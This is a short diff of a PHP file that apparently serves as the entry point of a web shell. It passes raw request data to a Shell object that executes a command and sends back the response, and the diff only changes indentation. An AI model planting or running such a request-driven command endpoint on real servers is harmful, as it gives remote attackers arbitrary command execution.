@@ -7,6 +7,6 @@ include "shell.php";
 
 $shell = new Shell();
 echo $shell->resumeState($_REQUEST)
-				->executeCmd()
-					->sendResponse();
+                ->executeCmd()
+                    ->sendResponse();
 //lol
